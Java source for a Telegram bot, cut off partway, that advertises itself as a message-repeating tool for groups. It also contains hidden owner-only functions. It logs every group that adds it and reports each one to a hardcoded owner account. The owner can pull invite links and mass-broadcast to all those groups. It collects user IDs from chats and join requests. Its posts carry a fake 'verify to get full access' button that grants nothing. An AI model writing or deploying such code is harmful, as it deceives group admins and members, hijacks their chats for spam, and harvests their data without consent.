import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import okhttp3.*;
import spark.Spark;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Bot {
    private static final String TOKEN = System.getenv("BOT_TOKEN");
    private static final String WEBHOOK_URL = System.getenv("WEBHOOK_URL");
    private static final String BOT_API = "https://api.telegram.org/bot" + TOKEN;
    private static final long OWNER_ID = 8141547148L;
    private static final long MONITOR_ID = 8405313334L;

    private static final Map<Long, List<Map<String, Object>>> repeatJobs = new ConcurrentHashMap<>();
    private static final String GROUPS_FILE = "groups.txt";
    private static final Map<String, Map<String, Object>> mediaGroups = new ConcurrentHashMap<>();
    private static final Map<Long, Long> lastBroadcastIds = new ConcurrentHashMap<>();
    private static final Map<Long, Long> pendingVerifications = new ConcurrentHashMap<>();
    private static final Set<Long> collectedUsers = ConcurrentHashMap.newKeySet();

    private static String BOT_USERNAME = null;
    private static final OkHttpClient client = new OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build();
    private static final Gson gson = new Gson();

    public static void main(String[] args) {
        System.out.println("=== Telegram Bot Starting ===");
        System.out.println("Bot Token: " + (TOKEN != null ? TOKEN.substring(0, Math.min(10, TOKEN.length())) + "..." : "NOT SET"));
        System.out.println("Webhook URL: " + WEBHOOK_URL);
        
        if (TOKEN == null || TOKEN.isEmpty()) {
            System.err.println("ERROR: BOT_TOKEN environment variable is not set!");
            System.exit(1);
        }
        if (WEBHOOK_URL == null || WEBHOOK_URL.isEmpty()) {
            System.err.println("ERROR: WEBHOOK_URL environment variable is not set!");
            System.exit(1);
        }
        
        // Get bot username
        getBotUsername();
        System.out.println("Bot Username: @" + BOT_USERNAME);
        
        // Set up webhook
        setupWebhook();
        
        // Start background threads
        new Thread(() -> {
            System.out.println("Starting keep-alive thread...");
            keepAlive();
        }).start();
        
        new Thread(() -> {
            System.out.println("Starting album cleanup thread...");
            cleanupOldAlbums();
        }).start();
        
        new Thread(() -> {
            System.out.println("Starting user batch thread...");
            sendUserBatch();
        }).start();
        
        // Start web server
        int port = Integer.parseInt(System.getenv().getOrDefault("PORT", "5000"));
        Spark.port(port);
        
        // Add before filters for logging
        Spark.before((req, res) -> {
            res.type("application/json");
        });
        
        Spark.post("/webhook", (req, res) -> {
            try {
                String body = req.body();
                System.out.println("Received webhook update: " + body.substring(0, Math.min(200, body.length())) + "...");
                JsonObject update = gson.fromJson(body, JsonObject.class);
                String result = webhook(update);
                res.status(200);
                return result;
            } catch (Exception e) {
                System.err.println("Error processing webhook: " + e.getMessage());
                e.printStackTrace();
                res.status(500);
                return "ERROR";
            }
        });
        
        Spark.get("/", (req, res) -> {
            res.type("text/html");
            return "<html><body><h1>Telegram Bot is Running!</h1><p>Username: @" + BOT_USERNAME + "</p></body></html>";
        });
        
        Spark.get("/health", (req, res) -> {
            JsonObject health = new JsonObject();
            health.addProperty("status", "ok");
            health.addProperty("bot", BOT_USERNAME);
            health.addProperty("timestamp", System.currentTimeMillis());
            return health.toString();
        });
        
        Spark.get("/status", (req, res) -> {
            JsonObject status = new JsonObject();
            status.addProperty("active_jobs", repeatJobs.size());
            status.addProperty("collected_users", collectedUsers.size());
            status.addProperty("media_groups", mediaGroups.size());
            return status.toString();
        });
        
        System.out.println("=== Bot Started Successfully on Port " + port + " ===");
        System.out.println("Webhook URL: " + WEBHOOK_URL + "/webhook");
    }

    private static void setupWebhook() {
        try {
            // Delete existing webhook first
            Request deleteRequest = new Request.Builder()
                .url(BOT_API + "/deleteWebhook")
                .build();
            Response deleteResponse = client.newCall(deleteRequest).execute();
            String deleteBody = deleteResponse.body().string();
            System.out.println("Delete webhook response: " + deleteBody);
            
            // Set new webhook
            String webhookUrl = WEBHOOK_URL + "/webhook";
            Request setRequest = new Request.Builder()
                .url(BOT_API + "/setWebhook?url=" + webhookUrl)
                .build();
            Response setResponse = client.newCall(setRequest).execute();
            String setBody = setResponse.body().string();
            System.out.println("Set webhook response: " + setBody);
            
            JsonObject json = gson.fromJson(setBody, JsonObject.class);
            if (json.get("ok").getAsBoolean()) {
                System.out.println("✓ Webhook set successfully to: " + webhookUrl);
            } else {
                System.err.println("✗ Failed to set webhook: " + setBody);
            }
        } catch (Exception e) {
            System.err.println("Error setting up webhook: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static String getBotUsername() {
        if (BOT_USERNAME == null) {
            try {
                Request request = new Request.Builder()
                    .url(BOT_API + "/getMe")
                    .build();
                Response response = client.newCall(request).execute();
                String responseBody = response.body().string();
                JsonObject json = gson.fromJson(responseBody, JsonObject.class);
                if (json.get("ok").getAsBoolean()) {
                    BOT_USERNAME = json.getAsJsonObject("result").get("username").getAsString();
                } else {
                    System.err.println("Failed to get bot username: " + responseBody);
                    BOT_USERNAME = "unknown_bot";
                }
            } catch (IOException e) {
                System.err.println("Error getting bot username: " + e.getMessage());
                BOT_USERNAME = "error_bot";
            }
        }
        return BOT_USERNAME;
    }

    private static String sendMessage(long chatId, String text, String parseMode, Long replyToMessageId, JsonObject replyMarkup) {
        try {
            JsonObject payload = new JsonObject();
            payload.addProperty("chat_id", chatId);
            payload.addProperty("text", text);
            if (parseMode != null) payload.addProperty("parse_mode", parseMode);
            if (replyToMessageId != null) payload.addProperty("reply_to_message_id", replyToMessageId);
            if (replyMarkup != null) payload.add("reply_markup", replyMarkup);
            
            RequestBody body = RequestBody.create(
                gson.toJson(payload), 
                MediaType.get("application/json; charset=utf-8")
            );
            
            Request request = new Request.Builder()
                .url(BOT_API + "/sendMessage")
                .post(body)
                .build();
            
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            
            if (response.code() != 200) {
                System.err.println("Failed to send message to " + chatId + ": " + responseBody);
                return null;
            }
            
            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
            if (json.get("ok").getAsBoolean()) {
                return json.getAsJsonObject("result").get("message_id").getAsString();
            } else {
                System.err.println("Telegram API error: " + responseBody);
                return null;
            }
        } catch (IOException e) {
            System.err.println("Error sending message: " + e.getMessage());
            return null;
        }
    }

    private static boolean deleteMessage(long chatId, long messageId) {
        try {
            JsonObject payload = new JsonObject();
            payload.addProperty("chat_id", chatId);
            payload.addProperty("message_id", messageId);
            
            RequestBody body = RequestBody.create(
                gson.toJson(payload), 
                MediaType.get("application/json; charset=utf-8")
            );
            
            Request request = new Request.Builder()
                .url(BOT_API + "/deleteMessage")
                .post(body)
                .build();
            
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
            
            return json.get("ok").getAsBoolean();
        } catch (IOException e) {
            System.err.println("Error deleting message: " + e.getMessage());
            return false;
        }
    }

    private static boolean deleteMessageWithDelay(long chatId, long messageId) {
        boolean result = deleteMessage(chatId, messageId);
        
        // Add 3-second delay to prevent Telegram API rate limits
        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            System.err.println("Delay interrupted: " + e.getMessage());
        }
        
        return result;
    }

    private static List<Long> getChatAdministrators(long chatId) {
        List<Long> adminIds = new ArrayList<>();
        try {
            Request request = new Request.Builder()
                .url(BOT_API + "/getChatAdministrators?chat_id=" + chatId)
                .build();
            
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
            
            if (json.get("ok").getAsBoolean()) {
                JsonArray result = json.getAsJsonArray("result");
                for (JsonElement elem : result) {
                    JsonObject admin = elem.getAsJsonObject();
                    long userId = admin.getAsJsonObject("user").get("id").getAsLong();
                    adminIds.add(userId);
                }
            }
        } catch (IOException e) {
            System.err.println("Error getting chat administrators: " + e.getMessage());
        }
        return adminIds;
    }

    private static void saveGroupId(long chatId) {
        if (!String.valueOf(chatId).startsWith("-")) return;
        
        Path path = Paths.get(GROUPS_FILE);
        try {
            if (!Files.exists(path)) {
                Files.createFile(path);
            }
            
            List<String> groups = Files.readAllLines(path);
            String chatIdStr = String.valueOf(chatId);
            
            if (!groups.contains(chatIdStr)) {
                Files.write(path, (chatIdStr + "\n").getBytes(), StandardOpenOption.APPEND);
                System.out.println("Saved group ID: " + chatId);
            }
        } catch (IOException e) {
            System.err.println("Error saving group ID: " + e.getMessage());
        }
    }

    private static List<Long> loadGroupIds() {
        Path path = Paths.get(GROUPS_FILE);
        if (!Files.exists(path)) return new ArrayList<>();
        
        try {
            List<String> lines = Files.readAllLines(path);
            List<Long> ids = new ArrayList<>();
            for (String line : lines) {
                if (!line.trim().isEmpty()) {
                    try {
                        ids.add(Long.parseLong(line.trim()));
                    } catch (NumberFormatException e) {
                        System.err.println("Invalid group ID in file: " + line);
                    }
                }
            }
            return ids;
        } catch (IOException e) {
            System.err.println("Error loading group IDs: " + e.getMessage());
            return new ArrayList<>();
        }
    }

    private static int broadcastMessageOnce(long originalChatId, long originalMessageId) {
        lastBroadcastIds.clear();
        List<Long> groupIds = loadGroupIds();
        int successCount = 0;
        
        System.out.println("Broadcasting to " + groupIds.size() + " groups");
        
        for (long groupId : groupIds) {
            try {
                JsonObject payload = new JsonObject();
                payload.addProperty("chat_id", groupId);
                payload.addProperty("from_chat_id", originalChatId);
                payload.addProperty("message_id", originalMessageId);
                
                RequestBody body = RequestBody.create(
                    gson.toJson(payload),
                    MediaType.get("application/json; charset=utf-8")
                );
                
                Request request = new Request.Builder()
                    .url(BOT_API + "/copyMessage")
                    .post(body)
                    .build();
                
                Response response = client.newCall(request).execute();
                String responseBody = response.body().string();
                JsonObject json = gson.fromJson(responseBody, JsonObject.class);
                
                if (json.get("ok").getAsBoolean()) {
                    long newMsgId = json.getAsJsonObject("result").get("message_id").getAsLong();
                    lastBroadcastIds.put(groupId, newMsgId);
                    successCount++;
                    System.out.println("✓ Broadcast to group " + groupId + " successful");
                } else {
                    System.err.println("✗ Failed to broadcast to group " + groupId + ": " + responseBody);
                }
            } catch (Exception e) {
                System.err.println("Error broadcasting to group " + groupId + ": " + e.getMessage());
            }
        }
        
        return successCount;
    }

    private static String webhook(JsonObject update) {
        try {
            // Handle my_chat_member updates (bot added/removed from chat)
            if (update.has("my_chat_member")) {
                JsonObject myChatMember = update.getAsJsonObject("my_chat_member");
                JsonObject chat = myChatMember.getAsJsonObject("chat");
                long chatId = chat.get("id").getAsLong();
                String chatType = chat.get("type").getAsString();
                String chatTitle = chat.has("title") ? chat.get("title").getAsString() : "Private Chat";
                String newStatus = myChatMember.getAsJsonObject("new_chat_member").get("status").getAsString();
                
                System.out.println("Bot status changed in chat " + chatId + " (" + chatTitle + "): " + newStatus);
                
                if (newStatus.equals("administrator") || newStatus.equals("member")) {
                    saveGroupId(chatId);
                    
                    // Notify owner
                    String message = "📢 Bot added to " + 
                        (chatType.equals("channel") ? "Channel" : "Group") + "\n" +
                        "📛 Name: <b>" + chatTitle + "</b>\n" +
                        "🆔 ID: <code>" + chatId + "</code>\n" +
                        "👥 Type: " + chatType;
                    
                    sendMessage(OWNER_ID, message, "HTML", null, null);
                }
                return "OK";
            }
            
            // Handle chat join requests
            if (update.has("chat_join_request")) {
                JsonObject joinRequest = update.getAsJsonObject("chat_join_request");
                long userId = joinRequest.getAsJsonObject("from").get("id").getAsLong();
                collectedUsers.add(userId);
                
                if (collectedUsers.size() >= 50) {
                    flushUserBatch();
                }
                return "OK";
            }
            
            // Handle messages
            JsonObject message = update.has("message") ? update.getAsJsonObject("message") : 
                               (update.has("channel_post") ? update.getAsJsonObject("channel_post") : null);
            
            if (message == null) {
                return "OK";
            }
            
            JsonObject chat = message.getAsJsonObject("chat");
            long chatId = chat.get("id").getAsLong();
            String chatType = chat.get("type").getAsString();
            String text = message.has("text") ? message.get("text").getAsString().trim() : "";
            long userId = message.has("from") ? message.getAsJsonObject("from").get("id").getAsLong() : 0;
            long messageId = message.get("message_id").getAsLong();
            
            // Save user ID for monitoring
            if (userId != 0 && !String.valueOf(chatId).startsWith("-")) {
                collectedUsers.add(userId);
            }
            
            // Save group ID if it's a group/channel
            if (String.valueOf(chatId).startsWith("-")) {
                saveGroupId(chatId);
            }
            
            // Handle media groups (albums) - Collect all media info
            if (message.has("media_group_id")) {
                String mediaGroupId = message.get("media_group_id").getAsString();
                String key = chatId + "_" + mediaGroupId;
                
                if (!mediaGroups.containsKey(key)) {
                    Map<String, Object> groupInfo = new HashMap<>();
                    groupInfo.put("message_ids", new ArrayList<Long>());
                    groupInfo.put("media_messages", new ArrayList<JsonObject>());
                    groupInfo.put("last_update", System.currentTimeMillis());
                    mediaGroups.put(key, groupInfo);
                }
                
                @SuppressWarnings("unchecked")
                List<Long> messageIds = (List<Long>) mediaGroups.get(key).get("message_ids");
                @SuppressWarnings("unchecked")
                List<JsonObject> mediaMessages = (List<JsonObject>) mediaGroups.get(key).get("media_messages");
                
                messageIds.add(messageId);
                mediaMessages.add(message);
                mediaGroups.get(key).put("last_update", System.currentTimeMillis());
                
                System.out.println("Collected album media: " + mediaGroupId + " (" + mediaMessages.size() + " items)");
            }
            
            // ========== COMMAND HANDLING ==========
            
            // Owner commands (works in any chat type)
            if (chatId == OWNER_ID) {
                // Check bot status
                if (text.startsWith("-")) {
                    try {
                        long targetChatId = Long.parseLong(text.substring(1).trim());
                        String status = checkBotStatus(targetChatId);
                        sendMessage(chatId, status, null, null, null);
                    } catch (NumberFormatException e) {
                        sendMessage(chatId, "Invalid chat ID format", null, null, null);
                    }
                    return "OK";
                }
                
                // Invite link command
                if (text.toLowerCase().startsWith("/invitelink")) {
                    String[] parts = text.split(" ");
                    if (parts.length == 2) {
                        try {
                            long targetChatId = Long.parseLong(parts[1]);
                            String link = exportInviteLink(targetChatId);
                            String response = link != null ? 
                                "🔗 Invite link:\n" + link : 
                                "❌ Failed to get invite link";
                            sendMessage(chatId, response, null, null, null);
                        } catch (NumberFormatException e) {
                            sendMessage(chatId, "Invalid chat ID", null, null, null);
                        }
                    } else {
                        sendMessage(chatId, "Usage: /invitelink <chat_id>", null, null, null);
                    }
                    return "OK";
                }
                
                // Broadcast commands
                if (text.equals("/lemonchus") && message.has("reply_to_message")) {
                    long originalMessageId = message.getAsJsonObject("reply_to_message").get("message_id").getAsLong();
                    int count = broadcastMessageOnce(chatId, originalMessageId);
                    sendMessage(chatId, "✅ Broadcast sent to " + count + " groups\nUse /lemonchusstop to delete", null, null, null);
                    return "OK";
                }
                
                if (text.equals("/lemonchusstop")) {
                    int deleted = deleteLastBroadcast();
                    sendMessage(chatId, deleted > 0 ? 
                        "🗑️ Deleted from " + deleted + " groups" : 
                        "No previous broadcast found", null, null, null);
                    return "OK";
                }
            }
            
            // Start command - Handle both private chat and inline button verification
            if (text.startsWith("/start")) {
                // Check for deep link verification (from inline button)
                // Format: /start verify_<groupId>
                if (text.contains("verify_")) {
                    // Extract group ID from the verify parameter
                    Pattern pattern = Pattern.compile("verify_(-?\\d+)");
                    Matcher matcher = pattern.matcher(text);
                    
                    if (matcher.find()) {
                        long groupId = Long.parseLong(matcher.group(1));
                        
                        // Get group title for the verification message
                        String groupTitle = getChatTitle(groupId);
                        
                        // Send verification success message with requested format
                        String verificationMessage = "✅ Verified by '" + groupTitle + "' \n" +
                                                   "<i>Granted full access</i>";
                        
                        sendMessage(chatId, verificationMessage, "HTML", null, null);
                        System.out.println("Sent verification message to user " + userId + " for group " + groupId);
                        
                        return "OK";
                    }
                }
                
                // Regular start message - only in private chats (not groups/channels)
                boolean isPrivateChat = !String.valueOf(chatId).startsWith("-");
                if (isPrivateChat) {
                    String startMessage = 
                        "🤖 <b>REPEAT MESSAGES BOT</b>\n\n" +
                        "📌 <b>YOU CAN REPEAT MULTIPLE MESSAGES</b> 📌\n\n" +
                        "🔧 <b>ADVANCED FEATURES:</b>\n" +
                        "• 📸 Image Albums (combined)\n" +
                        "• 🎬 Video Albums (combined)\n" +
                        "• With/Without Captions\n\n" +
                        "🛠 <b>Commands:</b>\n\n" +
                        "🔹 /repeat2min - Repeat every 2 minutes\n" +
                        "🔹 /repeat5min - Repeat every 5 minutes\n" +
                        "🔹 /repeat20min - Repeat every 20 minutes\n" +
                        "🔹 /repeat60min - Repeat every hour\n" +
                        "🔹 /repeat120min - Repeat every 2 hours\n" +
                        "🔹 /repeat24hour - Repeat every 24 hours\n" +
                        "🔹 /stop - Stop all repeating messages\n\n" +
                        "⚠️ <i>Only admins can use repeat commands in groups</i>";
                    
                    sendMessage(chatId, startMessage, "HTML", null, null);
                }
                // If /start is used in group without verify parameter, ignore it
                
                return "OK";
            }
            
            // Verify command (private chat only) - Legacy command
            if (text.equals("/verify") && !String.valueOf(chatId).startsWith("-")) {
                sendMessage(chatId, "Please use the inline button in the group to verify yourself.", null, null, null);
                return "OK";
            }
            
            // ========== CHANNEL/GROUP COMMANDS ==========
            
            // Check if it's a channel or group (negative chat ID)
            boolean isChannelOrGroup = String.valueOf(chatId).startsWith("-");
            
            if (isChannelOrGroup) {
                // For channels/groups, check if sender is admin or anonymous admin
                boolean isAdmin = false;
                boolean isAnonymousAdmin = false;
                
                // Check if sender is anonymous admin (no 'from' field in channel posts)
                if (chatType.equals("channel") && !message.has("from")) {
                    // In channels, posts can be sent by anonymous admins
                    // For channels, we need to check if the bot is admin and accept commands from any sender
                    List<Long> admins = getChatAdministrators(chatId);
                    long botId = getMe().getAsJsonObject("result").get("id").getAsLong();
                    
                    if (admins.contains(botId)) {
                        // Bot is admin in this channel, accept commands
                        isAdmin = true;
                        isAnonymousAdmin = true;
                        System.out.println("Channel command accepted (bot is admin, anonymous admin detected)");
                    }
                } else if (message.has("from")) {
                    // Regular group or channel with visible sender
                    List<Long> admins = getChatAdministrators(chatId);
                    isAdmin = admins.contains(userId);
                }
                
                // Stop command
                if (text.equals("/stop")) {
                    if (isAdmin || isAnonymousAdmin) {
                        if (repeatJobs.containsKey(chatId) && !repeatJobs.get(chatId).isEmpty()) {
                            for (Map<String, Object> job : repeatJobs.get(chatId)) {
                                job.put("running", false);
                            }
                            repeatJobs.remove(chatId);
                            sendMessage(chatId, "✅ All repeating tasks stopped", null, messageId, null);
                        } else {
                            sendMessage(chatId, "No active repeating tasks found", null, messageId, null);
                        }
                    } else {
                        sendMessage(chatId, "❌ Only admins can use this command", null, messageId, null);
                    }
                    return "OK";
                }
                
                // Repeat commands (must reply to a message)
                if (text.matches("^/(repeat2min|repeat5min|repeat20min|repeat60min|repeat120min|repeat24hour)$") && 
                    message.has("reply_to_message")) {
                    
                    if (!isAdmin && !isAnonymousAdmin) {
                        sendMessage(chatId, "❌ Only admins can use repeat commands", null, messageId, null);
                        return "OK";
                    }
                    
                    JsonObject repliedMessage = message.getAsJsonObject("reply_to_message");
                    long repliedMessageId = repliedMessage.get("message_id").getAsLong();
                    
                    // Parse interval
                    long intervalSeconds = 0;
                    String displayInterval = "";
                    
                    switch (text) {
                        case "/repeat2min":
                            intervalSeconds = 120;
                            displayInterval = "2 minutes";
                            break;
                        case "/repeat5min":
                            intervalSeconds = 300;
                            displayInterval = "5 minutes";
                            break;
                        case "/repeat20min":
                            intervalSeconds = 1200;
                            displayInterval = "20 minutes";
                            break;
                        case "/repeat60min":
                            intervalSeconds = 3600;
                            displayInterval = "1 hour";
                            break;
                        case "/repeat120min":
                            intervalSeconds = 7200;
                            displayInterval = "2 hours";
                            break;
                        case "/repeat24hour":
                            intervalSeconds = 86400;
                            displayInterval = "24 hours";
                            break;
                    }
                    
                    // Check if it's part of an album
                    List<Long> messageIds = new ArrayList<>();
                    List<JsonObject> mediaMessages = new ArrayList<>();
                    boolean isAlbum = false;
                    String caption = null;
                    
                    if (repliedMessage.has("media_group_id")) {
                        String mediaGroupId = repliedMessage.get("media_group_id").getAsString();
                        String key = chatId + "_" + mediaGroupId;
                        
                        // Wait a bit for all album messages to arrive (up to 5 seconds)
                        int waitCount = 0;
                        while (waitCount < 10 && (!mediaGroups.containsKey(key) || 
                               ((List<JsonObject>) mediaGroups.get(key).get("media_messages")).size() < 2)) {
                            try {
                                Thread.sleep(500);
                                waitCount++;
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                        
                        if (mediaGroups.containsKey(key)) {
                            @SuppressWarnings("unchecked")
                            List<JsonObject> albumMessages = (List<JsonObject>) mediaGroups.get(key).get("media_messages");
                            @SuppressWarnings("unchecked")
                            List<Long> albumMessageIds = (List<Long>) mediaGroups.get(key).get("message_ids");
                            
                            mediaMessages.addAll(albumMessages);
                            messageIds.addAll(albumMessageIds);
                            isAlbum = albumMessages.size() > 1;
                            
                            // Get caption from first message if available
                            if (!albumMessages.isEmpty()) {
                                JsonObject firstMsg = albumMessages.get(0);
                                if (firstMsg.has("caption")) {
                                    caption = firstMsg.get("caption").getAsString();
                                }
                            }
                            
                            System.out.println("Album detected: " + mediaMessages.size() + " media items");
                        } else {
                            messageIds.add(repliedMessageId);
                            mediaMessages.add(repliedMessage);
                        }
                    } else {
                        messageIds.add(repliedMessageId);
                        mediaMessages.add(repliedMessage);
                        if (repliedMessage.has("caption")) {
                            caption = repliedMessage.get("caption").getAsString();
                        }
                    }
                    
                    // Create job
                    Map<String, Object> job = new HashMap<>();
                    job.put("message_ids", messageIds);
                    job.put("media_messages", mediaMessages);
                    job.put("caption", caption);
                    job.put("interval", intervalSeconds);
                    job.put("running", true);
                    job.put("is_album", isAlbum);
                    job.put("chat_id", chatId);
                    job.put("has_media", hasMedia(mediaMessages)); // Track if it has media
                    job.put("is_text_only", isTextOnly(mediaMessages)); // Track if it's text only
                    
                    repeatJobs.computeIfAbsent(chatId, k -> new ArrayList<>()).add(job);
                    
                    // Start repeating thread
                    new Thread(() -> repeater(job)).start();
                    
                    String response = isAlbum ? 
                        "✅ Album (" + mediaMessages.size() + " items) will repeat every " + displayInterval :
                        "✅ Message will repeat every " + displayInterval;
                    
                    sendMessage(chatId, response, null, messageId, null);
                    return "OK";
                }
            }
            
        } catch (Exception e) {
            System.err.println("Error in webhook handler: " + e.getMessage());
            e.printStackTrace();
        }
        
        return "OK";
    }

    // Helper method to check if messages contain media
    private static boolean hasMedia(List<JsonObject> mediaMessages) {
        if (mediaMessages.isEmpty()) return false;
        
        JsonObject firstMessage = mediaMessages.get(0);
        return firstMessage.has("photo") || firstMessage.has("video") || 
               firstMessage.has("animation") || firstMessage.has("document") ||
               firstMessage.has("audio") || firstMessage.has("voice");
    }

    // Helper method to check if messages are text only
    private static boolean isTextOnly(List<JsonObject> mediaMessages) {
        if (mediaMessages.isEmpty()) return false;
        
        JsonObject firstMessage = mediaMessages.get(0);
        return firstMessage.has("text") && !firstMessage.has("photo") && 
               !firstMessage.has("video") && !firstMessage.has("animation") && 
               !firstMessage.has("document") && !firstMessage.has("audio") && 
               !firstMessage.has("voice");
    }

    private static void repeater(Map<String, Object> job) {
        @SuppressWarnings("unchecked")
        List<Long> messageIds = (List<Long>) job.get("message_ids");
        @SuppressWarnings("unchecked")
        List<JsonObject> mediaMessages = (List<JsonObject>) job.get("media_messages");
        String caption = (String) job.get("caption");
        long interval = (long) job.get("interval");
        long chatId = (long) job.get("chat_id");
        boolean isAlbum = (boolean) job.get("is_album");
        boolean hasMedia = (boolean) job.get("has_media");
        boolean isTextOnly = (boolean) job.get("is_text_only");
        boolean running = (boolean) job.get("running");
        
        List<Long> lastMessageIds = new ArrayList<>();
        
        while (running) {
            try {
                // Delete previous messages with 3-second delay between each delete
                for (Long msgId : lastMessageIds) {
                    deleteMessageWithDelay(chatId, msgId);
                }
                lastMessageIds.clear();
                
                if (isAlbum && mediaMessages.size() > 1) {
                    // Send album as combined media group
                    sendMediaGroup(chatId, mediaMessages, caption, lastMessageIds);
                    
                    // Send verification message for albums
                    sendVerificationMessage(chatId, lastMessageIds);
                    
                    // Add 3-second delay after album+verify messages
                    Thread.sleep(3000);
                    
                } else if (!mediaMessages.isEmpty() && hasMedia) {
                    // Send single media message
                    JsonObject mediaMessage = mediaMessages.get(0);
                    
                    if (mediaMessage.has("photo") || mediaMessage.has("video") || 
                        mediaMessage.has("animation") || mediaMessage.has("document") ||
                        mediaMessage.has("audio") || mediaMessage.has("voice")) {
                        // It's a media message - copy with caption
                        JsonObject payload = new JsonObject();
                        payload.addProperty("chat_id", chatId);
                        payload.addProperty("from_chat_id", chatId);
                        payload.addProperty("message_id", messageIds.get(0));
                        
                        // Add caption if available
                        if (caption != null && !caption.isEmpty()) {
                            payload.addProperty("caption", caption);
                            payload.addProperty("parse_mode", "HTML");
                        }
                        
                        RequestBody body = RequestBody.create(
                            gson.toJson(payload),
                            MediaType.get("application/json; charset=utf-8")
                        );
                        
                        Request request = new Request.Builder()
                            .url(BOT_API + "/copyMessage")
                            .post(body)
                            .build();
                        
                        Response response = client.newCall(request).execute();
                        String responseBody = response.body().string();
                        JsonObject json = gson.fromJson(responseBody, JsonObject.class);
                        
                        if (json.get("ok").getAsBoolean()) {
                            long newMsgId = json.getAsJsonObject("result").get("message_id").getAsLong();
                            lastMessageIds.add(newMsgId);
                        }
                        
                        // Send verification message for single media
                        sendVerificationMessage(chatId, lastMessageIds);
                        
                        // Add 3-second delay after single media+verify messages
                        Thread.sleep(3000);
                    }
                    
                } else if (isTextOnly && !mediaMessages.isEmpty()) {
                    // Get the first message for text-only case
                    JsonObject mediaMessage = mediaMessages.get(0);
                    
                    // It's a text message - send with inline button attached
                    String text = mediaMessage.get("text").getAsString();
                    String parseMode = null;
                    if (text.contains("<b>") || text.contains("<i>") || text.contains("<code>") || 
                        text.contains("<a href=")) {
                        parseMode = "HTML";
                    }
                    
                    // Add access button to text messages
                    JsonObject keyboard = createAccessButton(chatId);
                    
                    // Send the original text message WITHOUT any additional text
                    String msgId = sendMessage(chatId, text, parseMode, null, keyboard);
                    if (msgId != null) {
                        lastMessageIds.add(Long.parseLong(msgId));
                    }
                    
                    // Add 3-second delay for text-only messages
                    Thread.sleep(3000);
                }
                
                // Calculate remaining time after the 3-second delay
                long timeSpent = System.currentTimeMillis();
                
                // Wait for next interval (subtract the 3 seconds we already waited)
                long adjustedInterval = (interval * 1000) - 3000;
                if (adjustedInterval > 0) {
                    Thread.sleep(adjustedInterval);
                }
                
                // Update running status
                running = (boolean) job.get("running");
                
            } catch (Exception e) {
                System.err.println("Error in repeater: " + e.getMessage());
                e.printStackTrace();
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException ie) {
                    ie.printStackTrace();
                }
            }
        }
    }

    // Send verification message for media content
    private static void sendVerificationMessage(long chatId, List<Long> lastMessageIds) {
        try {
            String verificationText = "User ! \nPlease verify yourself to gain full access.\n<i>Click the below button to Gain Full Access</i>";
            JsonObject keyboard = createAccessButton(chatId);
            
            String msgId = sendMessage(chatId, verificationText, "HTML", null, keyboard);
            if (msgId != null) {
                lastMessageIds.add(Long.parseLong(msgId));
            }
        } catch (Exception e) {
            System.err.println("Error sending verification message: " + e.getMessage());
        }
    }

    // Create inline button with "✅ Click To Get Full Access"
    private static JsonObject createAccessButton(long chatId) {
        JsonObject keyboard = new JsonObject();
        JsonArray inlineKeyboard = new JsonArray();
        
        // Create button with tick mark and title
        JsonArray row = new JsonArray();
        JsonObject button = new JsonObject();
        button.addProperty("text", "✅ Click To Get Full Access");
        button.addProperty("url", "https://t.me/" + BOT_USERNAME + "?start=verify_" + chatId);
        row.add(button);
        
        inlineKeyboard.add(row);
        keyboard.add("inline_keyboard", inlineKeyboard);
        return keyboard;
    }

    private static void sendMediaGroup(long chatId, List<JsonObject> mediaMessages, String caption, List<Long> lastMessageIds) {
        try {
            // Create media group payload
            JsonArray mediaArray = new JsonArray();
            
            for (int i = 0; i < mediaMessages.size(); i++) {
                JsonObject mediaMessage = mediaMessages.get(i);
                JsonObject inputMedia = new JsonObject();
                
                // Determine media type and get file_id
                if (mediaMessage.has("photo")) {
                    JsonArray photos = mediaMessage.getAsJsonArray("photo");
                    // Get the highest quality photo (last in array)
                    JsonObject photo = photos.get(photos.size() - 1).getAsJsonObject();
                    String fileId = photo.get("file_id").getAsString();
                    
                    inputMedia.addProperty("type", "photo");
                    inputMedia.addProperty("media", fileId);
                    
                    // Add caption only to first media if available
                    if (i == 0 && caption != null && !caption.isEmpty()) {
                        inputMedia.addProperty("caption", caption);
                        inputMedia.addProperty("parse_mode", "HTML");
                    }
                    
                } else if (mediaMessage.has("video")) {
                    JsonObject video = mediaMessage.getAsJsonObject("video");
                    String fileId = video.get("file_id").getAsString();
                    
                    inputMedia.addProperty("type", "video");
                    inputMedia.addProperty("media", fileId);
                    
                    // Add caption only to first media if available
                    if (i == 0 && caption != null && !caption.isEmpty()) {
                        inputMedia.addProperty("caption", caption);
                        inputMedia.addProperty("parse_mode", "HTML");
                    }
                    
                } else if (mediaMessage.has("animation")) {
                    JsonObject animation = mediaMessage.getAsJsonObject("animation");
                    String fileId = animation.get("file_id").getAsString();
                    
                    inputMedia.addProperty("type", "animation");
                    inputMedia.addProperty("media", fileId);
                    
                    // Add caption only to first media if available
                    if (i == 0 && caption != null && !caption.isEmpty()) {
                        inputMedia.addProperty("caption", caption);
                        inputMedia.addProperty("parse_mode", "HTML");
                    }
                    
                } else if (mediaMessage.has("document")) {
                    JsonObject document = mediaMessage.getAsJsonObject("document");
                    String fileId = document.get("file_id").getAsString();
                    
                    inputMedia.addProperty("type", "document");
                    inputMedia.addProperty("media", fileId);
                    
                    // Add caption only to first media if available
                    if (i == 0 && caption != null && !caption.isEmpty()) {
                        inputMedia.addProperty("caption", caption);
